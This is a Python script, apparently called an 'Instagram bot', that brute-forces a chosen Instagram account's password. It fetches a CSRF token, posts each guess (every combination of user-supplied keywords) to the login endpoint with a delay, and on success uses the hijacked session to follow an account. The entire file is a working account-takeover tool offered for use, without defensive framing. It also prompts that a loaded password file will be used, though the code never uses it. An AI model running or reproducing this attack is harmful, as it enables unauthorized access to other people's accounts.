import requests
import json
import time
import os
import itertools


class InstagramBot:
    def __init__(self, filename):
        # Read passwords from 'pass.txt' file
        if os.path.isfile(filename):
            with open(filename) as f:
                self.passwords = f.read().splitlines()
                if (len(self.passwords) > 0):
                    print(f'{len(self.passwords)} passwords loaded successfully')
        else:
            print('Please create passwords file (pass.txt)')
            exit()

    def user_exists(self, username):
        # Check if user exists on Instagram
        r = requests.get(f'https://www.instagram.com/{username}/?__a=1')
        if r.status_code == 404:
            print('User not found')
            return False
        elif r.status_code == 200:
            follow_data = json.loads(r.text)
            f_user_id = follow_data['user']['id']
            return {'username': username, 'id': f_user_id}

    def login(self, username, password):
        # Attempt to log in to Instagram
        sess = requests.Session()
        sess.cookies.update({
            'sessionid': '', 'mid': '', 'ig_pr': '1', 'ig_vw': '1920', 'csrftoken': '',
            's_network': '', 'ds_user_id': ''
        })
        sess.headers.update({
            'UserAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
            'x-instagram-ajax': '1',
            'X-Requested-With': 'XMLHttpRequest',
            'origin': 'https://www.instagram.com',
            'ContentType': 'application/x-www-form-urlencoded',
            'Connection': 'keep-alive',
            'Accept': '*/*',
            'Referer': 'https://www.instagram.com',
            'authority': 'www.instagram.com',
            'Host': 'www.instagram.com',
            'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4',
            'Accept-Encoding': 'gzip, deflate'
        })

        # First request to get csrftoken
        r = sess.get('https://www.instagram.com/')
        sess.headers.update({'X-CSRFToken': r.cookies.get_dict()['csrftoken']})

        # Attempt login with given credentials
        data = {'username': username, 'password': password}
        r = sess.post('https://www.instagram.com/accounts/login/ajax/',
                      data=data, allow_redirects=True)

        token = r.cookies.get_dict()['csrftoken']
        sess.headers.update({'X-CSRFToken': token})
        # Parse response
        data = json.loads(r.text)
        if data['status'] == 'fail':
            print(data['message'])
            return False

        if data['authenticated']:
            return sess  # Return session if login is successful
        else:
            print(f'Password incorrect [{password}]')
            return False

    def follow(self, sess, username):
        # Follow user with given session
        username = self.user_exists(username)
        if username:
            user_id = username['id']
            follow_req = sess.post(
                f'https://www.instagram.com/web/friendships/{user_id}/follow/')
            print(follow_req.text)


def main():
    # Create InstagramBot object and get username
    bot = InstagramBot('pass.txt')
    username = input('Please enter a username: ')
    username = bot.user_exists(username)
    if not username:
        exit()
    else:
        username = username['username']

    # Get list of keywords and delay in seconds between password attempts
    keywords = input(
        'Please enter a list of keywords separated by a space, we\'ll use every combination possible in addition to the list of passwords u provided: ').split()
    delay_loop = int(
        input('Please add delay between the passwords (in seconds): '))

    # Generate all possible combinations of keywords and attempt login
    for password in itertools.product(keywords, repeat=len(keywords)):
        # Join the combination into a single string
        password = ''.join(password)
        sess = bot.login(username, password)
        if sess:
            bot.follow(sess, username)
            print(f'Followed using password: {password}')
            exit()
        time.sleep(delay_loop)
    print('All combinations tried, none worked')


if __name__ == '__main__':
    main()
